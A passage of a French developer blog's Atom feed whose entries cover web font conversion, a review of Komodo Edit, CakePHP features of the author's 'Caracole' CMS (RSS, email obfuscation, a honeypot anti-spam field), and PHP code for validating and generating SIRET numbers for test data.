&lt;a href=&quot;http://peter.upfold.org.uk/projects/dfontsplitter&quot;&gt;DFontSplitter&lt;/a&gt;, ce qui m&amp;#39;a
donnÃ© plein de polices .ttf.&lt;/p&gt;

&lt;p&gt;Corrompues, d&amp;#39;ailleurs, qu&amp;#39;il m&amp;#39;a fallu rÃ©parer grÃ¢ce Ã 
&lt;a href=&quot;http://www.acutesystems.com/sharecf.htm&quot;&gt;CrossFont&lt;/a&gt; (attention shareware de
15 jours). Sauf qu&amp;#39;il me convertit les fichiers en .otf.&lt;/p&gt;

&lt;p&gt;Pas de soucis pour Firefox, Safari et Opera qui comprennent ce format trÃ¨s
bien, mais pour IE, je dois convertir Ã§a en &lt;code&gt;.eot&lt;/code&gt; (grÃ¢ce Ã  &lt;a href=&quot;http://www.cuvou.com/wizards/ttf2eot.cgi&quot;&gt;ce converter en
ligne&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Qui ne prends malheureusement que des &lt;code&gt;.ttf&lt;/code&gt; comme source... Impossible de
trouver un converter otf =&amp;gt; ttf sous windows qui ne demande pas d&amp;#39;installer
des tas de choses, je suis donc passÃ© sous mon Ubuntu, ai tÃ©lÃ©chargÃ© FontForge
: Open =&amp;gt; Generate Font =&amp;gt; ttf et voila&lt;/p&gt;

&lt;p&gt;Edit : Et hop, &lt;a href=&quot;http://onlinefontconverter.com/&quot;&gt;un autre converter&lt;/a&gt; en ligne
de plus (otf, ttf, dfont)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Komodo Edit</title>
   <link href="http://blog.pixelastic.com/2009/03/25/komodo-edit/"/>
   <updated>2009-03-25T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/03/25/komodo-edit</id>
   <content type="html">&lt;p&gt;J&amp;#39;ai utilisÃ© de nombreux Ã©diteurs depuis que j&amp;#39;ai commencÃ© Ã  coder, et au fil
du temps j&amp;#39;ai changÃ©. Souvent parce qu&amp;#39;un bug particulier de ma version me
dÃ©rangeait beaucoup, ou parce que j&amp;#39;avais besoin d&amp;#39;une fonctionnalitÃ© que je
ne pouvais trouver que chez un concurrent.&lt;/p&gt;

&lt;p&gt;Je suis restÃ© trÃ¨s longtemps sur Webexpert, fais un court passage par Aptana,
avant de rester pendant les quelques derniÃ¨res annÃ©es sur Intype. Et
aujourd&amp;#39;hui, je viens de dÃ©couvrir Komodo Edit.&lt;/p&gt;

&lt;p&gt;Webexpert avait tout ce dont j&amp;#39;avais besoin il y a quelques annÃ©es, mais il
plantait sans raison assez souvent. Et quand je voyais ce que pouvais proposer
un logiciel comme Aptana avec son parseur intÃ©grÃ©, son autocomplete de code,
etc je me disais que j&amp;#39;Ã©tais vraiment Ã  la prÃ©histoire.&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai donc essayÃ© Aptana, mais je m&amp;#39;en suis vite lassÃ©, c&amp;#39;est une usine Ã  gaz.
Il sait certes tout faire mais il Ã©tait lent, et j&amp;#39;avais besoin de pouvoir
m&amp;#39;en servir rapidement.&lt;/p&gt;

&lt;p&gt;Je suis donc passÃ© Ã  Intype, qui est trÃ¨s lÃ©ger et qui possÃ©dait exactement
tout ce dont j&amp;#39;avais besoin et il le faisait bien. C&amp;#39;Ã©tait aussi le premier
Ã©diteur qui me permettait d&amp;#39;enregistrer mes fichiers correctement en UTF-8.
Ses colorations syntaxiques Ã©taient trÃ¨s claires, son systÃ¨me d&amp;#39;indentation
Ã©tait parfait, bref que du bon.&lt;/p&gt;

&lt;p&gt;Il n&amp;#39;avait pas d&amp;#39;autocomplete de code, ou alors je n&amp;#39;ai pas rÃ©ussi Ã  m&amp;#39;en
servir, mais Ã§a m&amp;#39;allait bien. Son seul dÃ©faut Ã©tait l&amp;#39;absence d&amp;#39;une fonction
de recherche dans plusieurs fichiers.&lt;/p&gt;

&lt;p&gt;Aujourd&amp;#39;hui je viens de passer Ã  Komodo Edit car j&amp;#39;avais dÃ©jÃ  vu en m&amp;#39;en
servant brievement qu&amp;#39;il avait une bonne gestion des commentaires multilignes
qu&amp;#39;il identifiait tout seul et rendait leur Ã©criture plus simple.&lt;/p&gt;

&lt;p&gt;Et lÃ  je suis en train de m&amp;#39;en servir et je suis bluffÃ© par le nombre d&amp;#39;atouts
qu&amp;#39;il a ! DÃ©jÃ  j&amp;#39;ai pu retrouver le mÃªme theme de couleurs que celui que
j&amp;#39;avais sur Intype, il gÃ¨re aussi bien l&amp;#39;indentation et enregistre
parfaitement en utf8. Jusqu&amp;#39;ici, il est du niveau d&amp;#39;Intype.&lt;/p&gt;

&lt;p&gt;Voici la liste des points positifs supplÃ©mentaires au fur et Ã  mesure que je
m&amp;#39;en sers :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Il a un parseur PHP intÃ©grÃ©, il m&amp;#39;a soulignÃ© une ligne en erreur, en m&amp;#39;indiquant l&amp;#39;erreur !&lt;/li&gt;
&lt;li&gt;L&amp;#39;autocomplete m&amp;#39;a l&amp;#39;air pas mal foutu, il va chercher dans la liste des fonctions et variables que j&amp;#39;ai dÃ©finies, ainsi que dans la liste des fonctions intÃ©grÃ©es de PHP.&lt;/li&gt;
&lt;li&gt;C&amp;#39;est extremement pratique pour les str_replace, explode et autres fonctions dont je ne me souviens jamais de l&amp;#39;ordre des arguments, parce qu&amp;#39;il me les affiche ainsi qu&amp;#39;une petite explication !&lt;/li&gt;
&lt;li&gt;Avec Ctrl+Espace, il peut me terminer un mot que j&amp;#39;ai commencÃ© s&amp;#39;il trouve une correspondance avec les fonctions que j&amp;#39;ai dÃ©finies&lt;/li&gt;
&lt;li&gt;Il me liste mÃªme toutes les mÃ©thodes d&amp;#39;un modÃ¨le quand je tape le nom de ce modÃ¨le. Avec la description et la liste des paramÃ¨tres tirÃ©e de mes propres commentaires&lt;/li&gt;
&lt;li&gt;Il ajoute automatiquement les } de fermeture quand on les ouvre&lt;/li&gt;
&lt;li&gt;Il enlÃ¨ve automatiquement les espaces qui trainent Ã  la fin d&amp;#39;un fichier. Ca aussi je sens que je vais aimer, vu le nombre de fois oÃ¹ j&amp;#39;ai eu des problÃ¨mes de &amp;quot;headers already defined&amp;quot; Ã  cause de problÃ¨me de ce genre !&lt;/li&gt;
&lt;li&gt;En passant mon curseur sur une couleur en hexadecimal et en appuyant sur Ctrl, il me donne un apercu de la couleur. Vraiment pratique en CSS&lt;/li&gt;
&lt;li&gt;ll me prÃ©vient en Javascript de mes array qui se terminent par des virgules, ce qui fait bugguer IE. Pratique&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Gestion des flux RSS</title>
   <link href="http://blog.pixelastic.com/2009/03/01/caracole-gestion-des-flux-rss/"/>
   <updated>2009-03-01T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/03/01/caracole-gestion-des-flux-rss</id>
   <content type="html">&lt;p&gt;Cela faisait quelques temps que je souhaitais ajouter une gestion des flux RSS
Ã  Caracole. J&amp;#39;ai donc recherchÃ© du cotÃ© du RssHelper intÃ©grÃ© Ã  cakePHP et l&amp;#39;ai
quelque peu modifiÃ© pour qu&amp;#39;il s&amp;#39;adapte Ã  mes besoins.&lt;/p&gt;

&lt;p&gt;En effet, il manquait selon moi quelques fonctions extremement importantes
pour la gÃ©nÃ©ration d&amp;#39;un flux complet, par exemple la possibilitÃ© de spÃ©cifier
des attributs aux diffÃ©rents noeuds, ou encore de passer le contenu entre
balises &amp;lt;![CDATA[]]&amp;gt;.&lt;/p&gt;

&lt;p&gt;Mais surtout la possibilitÃ© d&amp;#39;ajouter des noeuds de faÃ§ons rÃ©cursive, la
fonction RssHelper::item() ne permettant d&amp;#39;ajouter des noeuds qu&amp;#39;Ã  un seul
niveau.&lt;/p&gt;

&lt;p&gt;Bref, j&amp;#39;ai revu tout cela dans ma propre version du Helper, avec une autre
fonction pratique pour ajouter un thumbnail Ã  un post. Pour voir ce que cela
donne, et il vous suffit de vous abonner aux flus disponibles sur les pages du
blog ou sur la page &lt;a href=&quot;/realisations/&quot;&gt;RÃ©alisations&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai dÃ©couvert la syntaxe d&amp;#39;un flux RSS il y a seulement quelques jours, et je
n&amp;#39;ai testÃ© le rÃ©sultat qu&amp;#39;avec Netvibes, je pense donc qu&amp;#39;il me faut me livrer
Ã  quelques tests supplÃ©mentaires.&lt;/p&gt;

&lt;p&gt;En tout cas, il me suffit maintenant d&amp;#39;ajouter une variable $rssFeed Ã  un
modÃ¨le pour qu&amp;#39;un flux RSS lui soit automatiquement gÃ©nÃ©rÃ© (on peut prÃ©ciser
bien sur les informations devant Ãªtre affichÃ©es pour chaque modÃ¨le). Voila qui
encore un pas de plus pour Caracole :)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Antispam des adresses mails</title>
   <link href="http://blog.pixelastic.com/2009/02/25/caracole-antispam-des-adresses-mails/"/>
   <updated>2009-02-25T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/25/caracole-antispam-des-adresses-mails</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;Attention : Ce post n&amp;#39;est plus d&amp;#39;actualitÃ©. Je n&amp;#39;utilise plus du tout cette technique pour masquer les adresses mails car elle bloquait complÃ©tement la lisibilitÃ© aux personnes sans Javascript. Je n&amp;#39;ai pas encoe trouvÃ© de meilleure alternative pour le moment, nÃ©anmoins.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Pour faire suite au billet prÃ©cÃ©dent, un autre problÃ¨me que j&amp;#39;ai rencontrÃ©
dans le dÃ©veloppement des sites Ã©tait un moyen sÃ»r d&amp;#39;empecher qu&amp;#39;une adresse
mail exposÃ©e sur un site ne soit rÃ©cupÃ©rÃ©e par des robots crawlers et ne
deviennent la cible de leurs spams.&lt;/p&gt;

&lt;p&gt;Je parse donc chaque texte affichÃ© afin de remplacer les adresses mails par
une version cryptÃ©e, que Javascript dÃ©cryptera Ã  l&amp;#39;affichage. A chaque
affichage la clÃ© de cryptage est diffÃ©rente. Bon, l&amp;#39;algorithme de cryptage est
extremement simple, c&amp;#39;est juste une permutation alphabÃ©tique, chaque lettre
est remplacÃ©e par une autre. Et la clÃ©e est indiquÃ© dans l&amp;#39;attribut title de
mon code gÃ©nÃ©rÃ©.&lt;/p&gt;

&lt;p&gt;Il suffit d&amp;#39;Ã©tudier le Javascript pour rÃ©ussir Ã  comprendre comment dÃ©crypter
les mails, mais cela demande que le robot ai intÃ©grÃ© mon codage dans ses
paramÃ¨tres, ce qui n&amp;#39;est Ã  priori pas le cas. Et quand bien mÃªme se serait le
cas, je changerai la faÃ§on de crypter la clÃ©.&lt;/p&gt;

&lt;p&gt;Jetez un oeil au code source de cette page si vous le souhaitez pour voir
comment cette adresse : blabla@somewhere.com est Ã©crite.&lt;/p&gt;

&lt;p&gt;Cela devrait Ãªtre quelque chose de la forme :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;97tasbw84fv6_q3pn5yirchya15nq.p9b_jziggtc40lfolwxxk@meo26m70zj2d-sur@hev8u1-dk.3&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;protectFromSpam&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;noscript&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;icon icon_notice&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
    Cette adresse mail est protÃ©gÃ©e contre le spam, vous devez activer Javascript pour pouvoir la voir.
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;cryptedMail&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;ageh9gxvw1bag4342e&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Bon alors bien sur, cela nÃ©cessite Javascript activÃ©, c&amp;#39;est un gros dÃ©faut, je
l&amp;#39;admets. Un message permet de ne pas laisser l&amp;#39;utilisateur sans JS dans
l&amp;#39;incomprÃ©hension, mais Ã§a reste problÃ©matique malgrÃ© tout. Je n&amp;#39;ai pas rÃ©ussi
Ã  faire mieux pour le moment.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Spam sur les commentaires</title>
   <link href="http://blog.pixelastic.com/2009/02/24/caracole-spam-sur-les-commentaires/"/>
   <updated>2009-02-24T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/24/caracole-spam-sur-les-commentaires</id>
   <content type="html">&lt;p&gt;Les trois derniers sites que j&amp;#39;ai fait avec Caracole avaient tous un
formulaire de contact (nom, mail et texte, pour contacter le propriÃ©taire du
site).&lt;/p&gt;

&lt;p&gt;Et tous les trois se sont fait spammer rapidement une fois que le site est
arrivÃ© dans les moteurs de recherche. J&amp;#39;ai donc cherchÃ© moyen d&amp;#39;empecher cela,
une faÃ§on de detecter les spammeurs.&lt;/p&gt;

&lt;p&gt;Alors, il existe bien sur &lt;a href=&quot;http://akismet.com/&quot;&gt;Akismet&lt;/a&gt;, qui marche du
tonnerre, mais qui est payant pour un usage professionnel, j&amp;#39;ai donc d&amp;#39;abord
cherchÃ© du cotÃ© des solutions gratuites.&lt;/p&gt;

&lt;p&gt;Il y a le projet &lt;a href=&quot;http://recaptcha.net/&quot;&gt;reCaptcha&lt;/a&gt;, qui en plus d&amp;#39;empecher le
spam, permet d&amp;#39;aider la numÃ©risation de vieux livres, donc une assez bonne
idÃ©e mais qui ne semble pas disponible en franÃ§ais. C&amp;#39;est malheureusement un
impÃ©ratif sur les sites que je dÃ©veloppais.&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai donc plutot retournÃ© le problÃ¨me dans ma tÃªte et cherchÃ© un moyen facile
et ingÃ©nieux de faire la diffÃ©rence entre un humain et un bot. J&amp;#39;ai finalement
optÃ© pour un champ cachÃ© au sein du formulaire qui doit absolument rester
vide. Un bot le remplira automatiquement, un humain le laissera vide.&lt;/p&gt;

&lt;p&gt;J&amp;#39;avais tout d&amp;#39;abord mis ce champ en type=&amp;quot;hidden&amp;quot; et cela semblait
fonctionner, mais de plus rÃ©cents spams me l&amp;#39;ont fait passer enÂ  display:none
par CSS et je n&amp;#39;ai pas eu de nouveau spam depuis. Je continuerai de peaufiner
le systÃ¨me jusqu&amp;#39;Ã  ce que je trouve un blocage parfait ou que j&amp;#39;en ai marre et
que je me tourne vers Akismet :)&lt;/p&gt;

&lt;p&gt;Pour le moment, je loggue toutes les demandes de contact avec les informations
du Header, afin d&amp;#39;identifier certains patterns qui pourraient me permettre de
trouver plus facilement les spammeurs dans le lot.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Export des adresses mails</title>
   <link href="http://blog.pixelastic.com/2009/02/23/caracole-export-des-adresses-mails/"/>
   <updated>2009-02-23T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/23/caracole-export-des-adresses-mails</id>
   <content type="html">&lt;p&gt;Je viens de rajouter une petite fonctionnalitÃ© sur Caracole qui permet
d&amp;#39;exporter une liste d&amp;#39;adresses mails (actuellement les personnes souhaitant
s&amp;#39;abonner Ã  une newsletter) dans un format exploitable par les logiciels de
messagerie et les webmail.&lt;/p&gt;

&lt;p&gt;La liste peut Ãªtre exportÃ©e sous format vCard, ou encore CSV exploitable par
Outlook ou GMail.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Validation et gÃ©nÃ©ration de numero de SIRET</title>
   <link href="http://blog.pixelastic.com/2009/02/22/validation-et-generation-de-numero-de-siret/"/>
   <updated>2009-02-22T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/22/validation-et-generation-de-numero-de-siret</id>
   <content type="html">&lt;p&gt;Pour le projet sur lequel je travaille actuellement, je dois tester la
validatÃ©e d&amp;#39;un numero de SIRET. D&amp;#39;aprÃ¨s &lt;a href=&quot;http://fr.wikipedia.org/wi%0Aki/Syst%C3%A8me_d%E2%80%99identification_du_r%C3%A9pertoire_des_%C3%A9tablisse%0Aments&quot;&gt;WikipÃ©dia&lt;/a&gt; les numÃ©ros de SIRET possÃ¨dent une clÃ© finale permettant de vÃ©rifier
qu&amp;#39;ils soient biens formÃ©s.&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai donc retranscris ce calcul sous une rÃ¨gle de validation pour cakePHP, le
voici :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function validateSiret($data, $field) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $siret = r(&amp;#39; &amp;#39;, &amp;#39;&amp;#39;, $data[$field]);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $sum = 0;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  for($i=0;$i!=14;$i++) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $tmp = ((($i+1)%2)+1) * intval($siret[$i]);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if ($tmp&amp;gt;=10) $tmp-=9;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $sum+=$tmp;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  return ($sum%10===0);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Tout d&amp;#39;abord, je m&amp;#39;assure que le siret ne contienne pas d&amp;#39;espace. Puis je
passe nombre aprÃ¨s nombre pour calculer la somme (je multiplie par deux les
nombres d&amp;#39;index pair et par un ceux d&amp;#39;index impair). Si le rÃ©sultat est
supÃ©rieur Ã  10, j&amp;#39;additionne chaque chiffre entre eux (ce qui Ã©quivant Ã 
soustraire 9).&lt;/p&gt;

&lt;p&gt;Si le rÃ©sultat final est congru Ã  10, alors le numero de SIRET est valide.&lt;/p&gt;

&lt;p&gt;Il ne reste plus qu&amp;#39;Ã  l&amp;#39;ajouter Ã  mes rÃ©gles de validation :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;var $validate = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &amp;#39;siret&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;rule&amp;#39; =&amp;gt; array(&amp;#39;validateSiret&amp;#39;, &amp;#39;siret&amp;#39;),&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;message&amp;#39; =&amp;gt; &amp;quot;Le numero de SIRET indiquÃ© n&amp;#39;est pas valide.&amp;quot;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mais ce n&amp;#39;est pas tout. Comme pour mes tests je crÃ©e Ã  la volÃ©e des dizaines
d&amp;#39;enregistrements, j&amp;#39;avais besoin d&amp;#39;un gÃ©nÃ©rateur automatique de numero de
SIRET valides. Voici ce que j&amp;#39;ai fini par Ã©crire :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;public function siret() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  //On gÃ©nÃ¨re le dÃ©but du numero de siret&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $siret = &amp;#39;&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $sum = 0;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  for($i=0;$i!=8;$i++) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $rand = mt_rand(0,9);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $siret.=$rand;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //On ajoute une fois le rÃ©sultat si index impair, deux fois sinon&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $tmp = $rand * (1+($i+1)%2);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if ($tmp&amp;gt;=10) $tmp-=9;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $sum+=$tmp;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  //On ajoute 4 zeros&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $siret.=&amp;quot;0000&amp;quot;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  //On regarde combien il me manque pour etre congru Ã  10&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $diff = 10-($sum%10);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if ($diff&amp;gt;2) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $first = floor($diff/3);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $second = $diff-(2*$first);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $siret.=$first.$second;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  } else {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $siret.=&amp;#39;0&amp;#39;.$diff;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  return preg_replace(&amp;quot;/([0-9]{3})([0-9]{3})([0-9]{3})([0-9]{5})/&amp;quot;, &amp;quot;$1 $2 $3 $4&amp;quot;, $siret);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; }&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Le principe consiste Ã  gÃ©nÃ©rer les 8 premiers nombres de faÃ§on complÃ©tement
alÃ©atoire et d&amp;#39;en calculer la &amp;quot;somme&amp;quot; (selon le principe Ã©voquÃ© au dessus).
Puis on ajoute des zero pour combler l&amp;#39;espace jusqu&amp;#39;Ã  ajouter la clÃ© de
vÃ©rification.&lt;/p&gt;

&lt;p&gt;Bien sur, la clÃ© on va la crÃ©er pour que la somme de (2 x le premier chiffre)
+ (1 x le second) soit Ã©gal Ã  ce qu&amp;#39;il nous manque pour Ãªtre congru Ã  10.&lt;/p&gt;

&lt;p&gt;Et on fini par retourner le numero de faÃ§on lisible, par exemple : 774 082 010
00034.&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai fait une petite recherche sur &lt;a href=&quot;http://www.societe.com/&quot;&gt;societe.com&lt;/a&gt;,
aucun de mes numeros gÃ©nÃ©rÃ©s ne semble donner de rÃ©sultat, malgrÃ© tout ils
sont syntaxiquement valides.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Faire communiquer PHP et Javascript</title>
   <link href="http://blog.pixelastic.com/2009/02/21/faire-communiquer-php-et-javascript/"/>
   <updated>2009-02-21T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/21/faire-communiquer-php-et-javascript</id>
   <content type="html">&lt;p&gt;Pour un projet sur lequel je suis en ce moment, je dois faire une interface
d&amp;#39;administration assez complexe, le tout en AJAX.&lt;/p&gt;

&lt;p&gt;Je dois manipuler des donnÃ©es sorties de ma base de donnÃ©e, venant de trois
modÃ¨les diffÃ©rents, mais liÃ©s les uns avec les autres. Autant dire que j&amp;#39;ai de
gros tableaux imbriquÃ©s de donnÃ©es. La page travaille vraiment beaucoup et
manipule ces donnÃ©es constamment.&lt;/p&gt;

&lt;p&gt;Pour Ã©viter d&amp;#39;avoir Ã  faire une requete sur ma base Ã  chaque fois que j&amp;#39;ai
besoin d&amp;#39;une information, j&amp;#39;ai dÃ©cidÃ© de tout charger une premiÃ¨re fois au
chargement de la page, puis de modifier cotÃ© client les variables sur
lesquelles je travaille, pour ne faire des requetes au serveur qu&amp;#39;en upload
(update/add) et ainsi Ã©viter au maximum les requetes en download inutiles.&lt;/p&gt;

&lt;p&gt;Pour Ã§a, j&amp;#39;utilise tout d&amp;#39;abord le base64 de php pour passer des objets
complexes (au format JSON) Ã  mes scripts. &lt;a href=&quot;http://www.semnanweb.com/jquery-plugin/base64.html&quot;&gt;Muhammad Hussein
Fattahizadeh&lt;/a&gt; a pour cela
mis Ã  disposition une retranscription de l&amp;#39;encodage/decodage en base64 pour
jQuery.&lt;/p&gt;

&lt;p&gt;Je peux stocker ainsi mes objets de faÃ§on &amp;quot;dormante&amp;quot; dans ma page, et les
dÃ©coder pour rÃ©cupÃ©rer/modifier les valeurs dont j&amp;#39;ai besoin avant de les
rÃ©encoder et de les re-ranger dans mon DOM. L&amp;#39;avantage de stocker ces
informations en base64 c&amp;#39;est que je ne risque pas de causer d&amp;#39;erreur de
syntaxe, de balise non fermÃ©e, de caractÃ¨re interdit, mÃªme si je manipule des
objets contenant du code HTML et que j&amp;#39;ai besoin de le stocker dans mon propre
DOM.&lt;/p&gt;

&lt;p&gt;J&amp;#39;utilise aussi Ã  cotÃ© de Ã§a le &lt;a href=&quot;http://json.org/json2.js&quot;&gt;parseur officiel
JSON&lt;/a&gt; pour parser mes Ã©lÃ©ments JSON. Il ne me reste
plus qu&amp;#39;Ã  passer mon Ã©lÃ©ment JSON en paramÃ¨tre aux fonction AJAX de jQuery
pour mettre Ã  jour mes donnÃ©es.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>CrÃ©er plusieurs formulaires sur la mÃªme page avec FormHelper::create</title>
   <link href="http://blog.pixelastic.com/2009/02/20/creer-plusieurs-formulaires-sur-la-meme-page-avec-formhelper-create/"/>
   <updated>2009-02-20T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/20/creer-plusieurs-formulaires-sur-la-meme-page-avec-formhelper-create</id>
   <content type="html">&lt;p&gt;CakePHP permet de crÃ©er trÃ¨s facilement des formulaires dont l&amp;#39;action
(add/edit) ainsi que les champs sont remplis automatiquement grÃ¢ce Ã 
&lt;code&gt;FormHelper::create&lt;/code&gt; et &lt;code&gt;FormHelper::end&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Il prends pour cela les variables contenues dans le $data du controller, qui
sont alors passÃ©es au $data de la vue.&lt;/p&gt;

&lt;p&gt;Si on veut changer le modÃ¨le et/ou les valeurs utilisÃ©es par le formulaire, il
suffit de faire nos modifications dans le &lt;code&gt;$this-&amp;gt;data&lt;/code&gt; directement dans la vue
avant d&amp;#39;appeller &lt;code&gt;$form-&amp;gt;create()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Par contre, si sur une mÃªme page on possÃ¨de plusieurs formulaires, tous d&amp;#39;un
modele diffÃ©rent, l&amp;#39;astuce ne fonctionne plus. FormHelper s&amp;#39;est initialisÃ©
lors de son premier appel et utilisera le mÃªme set de model et valeurs pour
les autres.&lt;/p&gt;

&lt;p&gt;MÃªme modifier &lt;code&gt;$this-&amp;gt;data&lt;/code&gt; avant chaque appel Ã  &lt;code&gt;$form-&amp;gt;create()&lt;/code&gt; ne changera
rien.&lt;/p&gt;

&lt;p&gt;Il faut donc ruser et modifier la variable utilisÃ©e par le Helper, c&amp;#39;est Ã 
dire modifier &lt;code&gt;$form-&amp;gt;data&lt;/code&gt; Ã  partir du second formulaire.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Edition directe</title>
   <link href="http://blog.pixelastic.com/2009/02/19/caracole-edition-directe/"/>
   <updated>2009-02-19T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/19/caracole-edition-directe</id>
   <content type="html">&lt;p&gt;En plus de son interface d&amp;#39;administration complÃ¨te, Caracole permet un mode
d&amp;#39;Ã©dition rapide directement accessible depuis le cotÃ© front-end des sites,
pour corriger rapidement un titre ou un coquille qui se serait glissÃ©e quelque
part.&lt;/p&gt;

&lt;p&gt;GrÃ¢ce Ã  jQuery et cakePHP, cette fonctionnalitÃ© est trÃ¨s simple Ã  utiliser. Il
suffit pour cela d&amp;#39;avoir les droits d&amp;#39;administration sur le site que l&amp;#39;on veut
